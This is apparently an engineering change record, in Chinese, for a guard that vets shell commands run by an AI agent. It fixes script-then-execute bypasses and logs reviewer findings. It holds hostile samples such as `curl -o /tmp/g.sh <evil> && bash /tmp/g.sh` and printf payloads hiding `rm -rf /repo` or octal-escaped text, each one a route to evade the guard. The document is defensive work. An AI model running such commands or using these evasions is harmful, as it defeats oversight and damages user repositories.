---
id: F20261019wvcp
title: wv 造-执对收编——writerContent 扩 argv 写面（cp/mv/install/ln/tee/curl/wget/dd）+ 链内源内容透传 + 词面证 writeFile 族（M-026d87ff）
summary: delta5 裁决立案（2026-10-14）的 wv 侧收编：writerContent 原只收重定向/echo/printf/cat/tee/heredoc 写，造-执对不识别 cp/curl -o 等 argv 写通道——`curl -o /tmp/g.sh <evil> && bash /tmp/g.sh` 的造段不进配对识别，掉到 fs 缺席证明（eval 时文件未造出=absent）→ 放行 → 运行时造+执行逃逸（固化失败实证 10 红）。收编三件：①argv 写面进造段识别（内容不可知→fail-closed，与 `echo "$X" > f && bash f` 既有机制同语义）②链内源内容透传（cp/mv/install/ln 保内容拷贝追链内源写段递归重建——corpus TS-402d73e5 服务脚本形态守恒的关键）③词面证补 writeFile/appendFile（delta9 观察1 潜伏面收口）。另修 pair 管道段排除（tee 漏收真根因；delta1 终版=排除整体移除，见审视处置节）。
change_type: fix
capability_test: tests/frameworks/agent/wv-creator-exec-pair.test.ts（拦截侧 38 + 放行侧 21 + 词面 3 = 62 例：首轮修前 10 红固化 + delta1 审视修复 20 红固化 + delta2 补刀 5 红固化 + delta3 交互收口 5 红固化）+ guard-touchstone exam/corpus 守恒（放行池零 GAP_DIFF、judge 考试零扰动）+ 全量 399 files 6311 passed + 6 skipped 零失败 + tsc/eslint 零报
risk_and_residual: |
  收编方向=多拦不放（fail-closed），主要风险是误拦扩散——以 corpus 守恒+judge 考试零扰动为验收闸（delta5 裁决原文）。实施中 TS-402d73e5（heredoc 造服务脚本 + cp 透传 + node 执行，真实开发形态）翻转红灯，经「链内源内容透传」修回守恒（内容可判读就不该 fail-closed）。残余面（记档）：①tee/管道流输入内容恒不可知=有意保守（delta5 口径明列「管道输入」为不可重建）②跨命令的外部源内容恒 fail-closed ③cp/mv 多源形态逐源候选已覆盖但链式拷贝深度限 4 ④downloadWriteTargets 未知短旗标停扫后簇内 o/O 漏认（保守侧不假提取）、未知长旗标分离值不消耗位置词（保守侧不误吞 URL）⑤正写通道旧口径的常规形态 cp/mv destArgs 顺扫多候选（源混入写面=保守面）保持不动 ⑥动态写目标 × 静态执行面的假缺席证明（`cp -t $VAR src && bash /tmp/g.sh` 形态）=既有模型边界（echo > $F 同形），非本次引入。
mechanism_budget: |
  新增机制：无。造-执对识别扩面是「造出内容为权威载荷」既有机制（牙2）对 argv 写面的补齐；链内源内容透传是「内容可重建则判读」既有语义（heredoc/echo 重建）在拷贝族的自然延伸；「内容不可知→fail-closed」既有（`>>` 链实测 script-payload-dynamic）。删除机制：无。pair 管道排除移除（delta1）=既有语义内修（bash 实测「重定向优先于管道」，旧排除本身是回归根因）。净方向：write-target-evaluator 函数增减相抵（delta1：抽 redirectWriteContent/copyFamilyArgs/downloadWriteTargets（换 curlOutputTargets）+ 配对逐面化；delta2：printfFormatContent 重建语义收口）——均模块内 helper 抽取，复杂度阈内或带禁用注释，无接口变更。
created_in_conversation: 7b41e085-5c21-4bd1-adfe-dc3ef051753d
causal_links:
  - M-026d87ff（工单：wv 造-执对收编——writerContent 扩至 cp/curl -o + 求值器写调用词表补 writeFileSync/writeFile）
  - F20261015smrj（delta5 裁决立案原文「验收必带 corpus 守恒 + judge 考试零扰动」；造-执对三态机制本文档扩面；delta9 观察1 词面补记）
  - F20261019gses（单一求值器终态——wv 从影子记账转唯一裁决，本收编的紧迫性随切换上升为红线地雷）
  - F20261015gsub（物理隔离兜底线——残余面记档口径参照）
---

## 问题陈述

造-执对（命令内造脚本再执行）的载荷判读机制（牙2/牙3）以「造出内容为权威载荷」为轴：内容可重建则判读，不可重建则 fail-closed（`echo "$X" > f && bash f` → script-payload-dynamic）。但造段识别只认**重定向写**：

1. **argv 写面整族不进配对识别**：`curl -o /tmp/g.sh <evil> && bash /tmp/g.sh`、`cp /src/g.sh /tmp/g.sh && bash /tmp/g.sh` 等——writerContent 无 redirect 直接返回 null，配对回扫跳过，执行段掉到 fs 缺席证明（eval 时文件尚未造出 → absent → 放行），运行时造+执行逃逸。固化失败实证：**10 个拦截形态全红**（curl/wget/cp/ccp 尾杠/mv/install/tee/dd/ln/良性内容 cp）。
2. **tee 造-执对另有真根因**：pair 管道段排除条件 `segs[j].joiner === "|"` 用的 joiner 语义错位——joiner 挂**入端**（探针实证 `echo pwn | tee x` 的 tee.joiner="|"），排除条件把管道**消费侧**（落盘写方）整个跳过，注释原例「echo a | tee x 的 tee 才是写方」从未被实现。（delta1 补注：原修法改判「下一段经管道接入」仍错——把写段 stdout 进管道也排除了；终版=排除整体移除，见审视处置节发现 1）
3. **词面证潜伏面（delta9 观察1）**：write-word-face 词面正则有 writeFileSync 无 writeFile（异步族）——非主仓字面量载荷会被词面证洗白（主仓字面量闸对字面形态已兜住，回归钉实测 writeFileSync/writeFile 字面形态现 BLOCK，潜伏面是构造路径载荷）。

## 设计取舍

**机制判定前置（修法决策树四问）**：①新增机制？否——造-执对识别扩面 + 既有「内容不可知→fail-closed」在 argv 写面的补齐。②删除机制？否。③收窄管辖？否——扩执行覆盖面，不收窄规则管辖域。④既有语义内修？**是**（narrow-fix）：「造出内容为权威载荷、可重建则判读、不可知则 fail-closed」的既有语义在漏收写法上的执行补齐。

- **取舍 1：argv 写面统一 content=null（fail-closed），不猜拷贝/下载内容**——cp/curl -o 的内容在命令形态内不可重建，delta5 口径「内容不可知=dynamic」明列「cp/mv/管道输入」。与 `echo hi >> f && bash f` 既有 fail-closed 同语义。
- **取舍 2（关键，corpus 守恒闸）：链内源内容透传**——cp/mv/install/ln 是**保内容拷贝**：源文件是同命令链内造出的（heredoc/echo 静态内容）则内容透传可判读（TS-402d73e5：heredoc 造服务脚本→cp 透传→node 执行，真实开发形态）。「内容不可知」指的是判读不能，链内可追回的内容判不可知是**过杀**（corpus 放行池翻转实证）。外部源/追不到/超深（链式拷贝限深 4）→ 仍 fail-closed。逆序扫（同路径后写覆盖前写；追加写 content=null 吃到即 fail-closed，保守侧一致）。**边界衔接（delta2 S4）**：ln -s 的 copyOf 透传只管内容判读（链内源=内容可判读），穿链写主仓的负门归 F20261019syml（symlink 逃逸 realpath 归一化，wv 通道）——两层各管一段，不重复判定。
- **取舍 3：管道写段不排除（delta1 修正——本条原为 joiner 语义校准，被检视獭1554 发现 1 推翻）**：原实现把「写段 stdout 进管道」整段跳过，理由是「管道消费侧才是落盘写方（`echo x > f | wc` 不是写方）」——该理由**违背 bash 语义**：重定向优先于管道，`echo x > f` 的 f 写入不受管道影响。修正后无任何管道排除：写面判定只看重定向/argv 写面（发现 1 回归钉：`echo pwn > f | wc && bash f` 基线 BLOCK→曾放行→现按内容判读 BLOCK）。管道只影响内容可判读性，由 content=null 承担。
- **已排除路径**：「cp 造-执对一律拦」——翻 TS-402d73e5 违反 corpus 守恒验收（delta5 硬闸）；「tee 也走透传」——管道流内容 delta5 明列为不可重建，维持 fail-closed（有意保守，与 `>>` 同口径）；「扩大词面证到裸 writeFile 之外」——超工单射程，记档残余。

## 影响范围

- 判定语义变化仅限：**argv 写面造段 × 执行段配对**形态（原放行→fail-closed BLOCK）+ **链内透传形态**（内容可判读→按内容判）。非配对的 cp/curl 写目标判定（写主仓=拦）原样（写目标提取 F20261015smrj 通道 b/c 已覆盖，本次零改动）。
- **delta1 后扩展**（详见下节审视处置）：管道写段配对（发现 1）、旗标形态收编（发现 2）、-t 归一（发现 3，含正写通道）、覆盖语义逆序（发现 4）、tee 双写面（发现 7）、printf 单参重建（附带修）。
- 既有 pinned 形态零漂移：corpus 放行池零 GAP_DIFF、judge 考试零扰动、全量 399 files 6294 passed 零失败。
- write-word-face 词面证补 writeFile/appendFile：词面洗白面收窄（更少放行），字面形态判定不变。

## 审视处置（delta1，检视獭1554 一审，大獭裁决 2026-10-19）

| 发现 | 处置 | 落位 |
|---|---|---|
| 1（新引入回归：管道接续写段被排除，BLOCK→ALLOW） | 本 PR 修——排除条件整体移除（bash 语义：重定向/argv 写面不受管道影响） | pairPlanFor；回归钉 echo/printf/cat 三形态 |
| 2（旗标形态同型洞 9 形态） | 本 PR 修——downloadWriteTargets 全形态收编：合并短旗标簇（-so/-sfo/-qO）、长旗标（--output-document=/--output-file=/--directory-prefix=）、目标前置（-t/--target-directory）、默认落盘（wget 无 -O→saveDir/basename(URL)）、remote-name（curl -O/--remote-name→basename(URL)） | argvWriterContent/downloadWriteTargets；回归钉 9 形态 |
| 3（cp --target-directory= 与 -t 两通道割裂） | 本 PR 修——拷贝族 -t/--target-directory 三形态（分离/=/附着）在配对通道（copyFamilyArgs）与正写通道（evalTargetArgCommand/evalExtendedWriteTargets）归一解析（一条语义一个接口），顺带修正「-t 目标词被当源文件」误拦 | 两通道同钉 |
| 4（覆盖语义反转：顺扫取先写） | 本 PR 修——pairPlanFor 改逆序扫（后写覆盖前写，与 chainContentPlan 同语义） | pairPlanFor；镜像双钉（恶意后写拦/良性后写放） |
| 5（curl\|bash 管道直执，pre-existing 射程外） | 记档独立立案 M-38fb45c0（不同攻击族：不落盘直执），不搭本 PR | — |
| 6（验证节引用归档即删的 debug 文件） | 本 PR 修——joiner 三段值内联正文（见验证节） | 本文档 |
| 7（tee argv 面遮蔽重定向面，Z11） | 本 PR 顺手修——writerContent 双写面并集（逐面独立 content/copyOf） | writerContent；Z11 钉 |

**附带修（实现中发现，同分支同型假重建——独立 commit 可剥离）**：printf 旧重建三种形态均把非空文件谎报成错内容（单参丢 format 重建为空串、多参丢 format、转义不解释），`printf 'touch /repo/x\n' > f && bash f` 被判良性放行（逃逸）——pre-existing（#1466 引入），属「造出内容为权威载荷」语义在内容重建上的假实现，与发现 7 同分支同型。delta1 首修（单参=format 本体）后被 delta 复审用哑参/八进制转义绕破（S1/S2），delta2 二修（format 骨架+裸 %s 代入）再被「过滤器×渲染」交互绕破（delta3 发现 1-3），delta3 终版收口（见下节）——「假重建=谎报内容=逃逸面」的三次返工全部栽在同一根因带：重建精度每提一层，被旧过滤器丢掉的词就多骗一层。corpus 零暴露（无「printf 造+执」冻结条目），exam 零扰动实证。

## 审视处置（delta2，检视獭1554 delta 复审，2026-10-19）

delta1 七条处置逐条复核验证通过（管道排除移除零漂移、旗标面收编、-t 归一、覆盖逆序、joiner 内联、tee 双写面均实测正确），附带修被自身 2 个绕破面拦下（本节）：

| 发现 | 处置 | 落位 |
|---|---|---|
| S1（严重·多参哑参逃逸）：旧多参分支丢 format——bash 实测 format 无转换符时多余实参被忽略、format 即内容，单参修复加一个哑参即绕破 | 修——format 即骨架：单/多参同走 printfFormatContent（无转换符=format 本体；含转换符仅裸 %s 精确代入，format 按 bash 语义复用耗尽实参，bash 对拍 `'%s-%s\n' a b c`→`a-b\nc-\n`） | redirectWriteContent/printfFormatContent；双钉（哑参拦/良性哑参放） |
| S2（严重·八进制转义缺口）：只认 \0nnn，bash 实测 \nnn 无前导 0 同样解释（\57→/），逐字节八进制编码载荷即骗过判读 | 修（保守路，#1513 不军备化）：转义仅白名单（\\a\\b\\e\\f\\n\\r\\t\\v\\\\'"）可解释，其余（\nnn 八进制/\xHH/未知）一律 null → 既有 fail-closed 兜住——转义形态穷举=军备化反面（漏一个形态=新逃逸） | printfFormatContent；钉 S2 八进制 + S2b 十六进制（同族一并关） |
| S1'（修复完整性补强，超出处方的一处）：含转换符多参走旧 %s\n 近似仍丢 format 字面部分（`printf 'touch /repo/x %s\n' a` 重建="a"）——同款「一绕即破」 | 修——裸 %s 代入含 format 字面部分（bash 对拍实证）；%d/%x/宽度精度修饰不猜→null | printfFormatContent；钉 S1' 拦截 + format 复用放行 |
| S3（建议·文档陈旧）：机制判定段「+2 函数」「joiner 校准」是 delta1 前表述 | 修——mechanism_budget 对齐终版语义（管道排除移除、函数增减相抵） | 本文档 |
| S4（建议·边界衔接）：ln -s 透传与 F20261019syml 边界未声明 | 修——copyOf 透传只判内容（链内源可判读），穿链写主仓的负门归 F20261019syml realpath 归一化（wv 通道），两层各管一段不重复判定 | 本文档 + 代码注释 |

**残余记档（delta2 新增）**：含非 %s 转换符的 printf 造段（如 `printf '%d' 42 > f`）→ null fail-closed（有意保守，非逃逸）；format 含白名单外转义的良性形态同保守侧（多拦不放）。

## 审视处置（delta3，检视獭1554 delta2 复审，2026-10-19）

delta2 派工两焦点裁定全过（S1' 半步采纳不收回处方、S2 保守边界符合 #1513），锚点全复现；但检视獭换机制视角（重建器本身）挖出 3 严重（含 1 个 delta2 自身回归——「含 % 即 null」兜底被精确渲染取消）：

| 发现 | 处置 | 落位 |
|---|---|---|
| 1（严重·delta2 回归）：旧 echo 式旗标过滤无条件丢 `-` 词 × %s 空位补空渲染 → dash 实参载荷假良性（`printf '\n%s\n' '-e<NL>touch /repo/data/pwn'`） | 修——printf 分支不再共用 echo 过滤器：不无条件丢 `-` 词（bash builtin 实测选项位仅 -v NAME/--，dash 实参是 %s 数据） | redirectWriteContent；真换行口径钉 + literal \n 口径对照钉 |
| 2（严重）：`--` 与 dash-format 双过筛重建空串谎报空内容（三代全 ALLOW） | 修——前导 `--` 消费后 format/实参全保留逐词精确重建（format escape 正常解释） | 拦截钉 + 良性 `--` 钉 |
| 3（严重）：载荷藏被丢实参（`'%s %s\n' 'rm' '-rf /repo'` 重建="rm ") | 修——实参全部保留进 %s 代入（bash 对拍 `rm -rf /repo\n`） | 拦截钉 |
| 歧义兜底（修法核心，检视獭处方「剥离位落 format/实参位即 null」）：无 `--` 而 format 位是 dash 词 =选项位歧义（builtin 报错空输出 vs POSIX format 输出 vs -v 变量落点，探针 od 实证三态）→ null | fail-closed 兜住 | 2 歧义闸钉 |
| 4（建议·echo -e \xHH 假重建，echo 同族同病） | 记档独立立案 **M-e4a199a1**（射程外论证见 PR review） | — |
| 5（建议·族外延 sed -i/tar/unzip/rsync 造-执对缺席） | 记档排期 **M-f6762368**（声明 8 族面本身 8/8 在位 ✓） | — |

**残余记档（delta3 新增）**：无 `--` 的 dash-format/-v 形态一律 null fail-closed（含 builtin 实测本就空输出的良性形态，多拦不放）；echo 分支的旗标过滤未动（M-e4a199a1 射程）。

## 验证

- **固化失败（修前）**：回归钉 10 红（造-执对 argv 写面全族）+ 8 绿（放行侧/词面字面形态）〔首轮运行记录〕；delta1 修复面修前 20 红固化（新钉对旧码复跑实证）；delta2 修复面修前 5 红固化（S1 哑参/三哑参/S1'/S2 八进制/S2b 十六进制，stash 源码复跑实证）；delta3 修复面修前 5 红固化（发现 1-3 + 歧义闸 2，stash 源码复跑实证）
- **修后**：同文件 **62/62 绿**（首轮 19 + delta1 钉 26 + delta2 钉 8 + delta3 钉 9）；
- **corpus 守恒（delta5 硬闸）**：guard-touchstone exam 放行池/拦截池/条件库 **零 GAP_DIFF**（TS-402d73e5 经透传修回；delta1 旗标/管道/printf 修复经语料暴露面预检（wget/`-O`/`-t`/`--target-directory` 全库 0 条、printf 单参造+执 0 条）+ 复跑双证零扰动；delta2 printf 重建收口同验零扰动）、judge 考试零扰动；
- **全量**：399 files **6311 passed + 6 skipped 零失败**；tsc / eslint 零报；
- 探针证据（内联，不依赖工作区文件）：`echo pwn | tee x && bash x` 三段 joiner= "" / "|" / "&&"（joiner 挂**入端**：tee 的 joiner="|" 表示 tee 经管道接入上一段）——delta1 起配对判定不再依赖 joiner（写面判定与管道位置无关）；printf 重建 bash 对拍：`printf 'touch /repo/x %s\n' a`→`touch /repo/x a\n`、`'%s-%s\n' a b c`→`a-b\nc-\n`、`'%s\n'`→`\n`（重建与真实输出逐字节一致）。
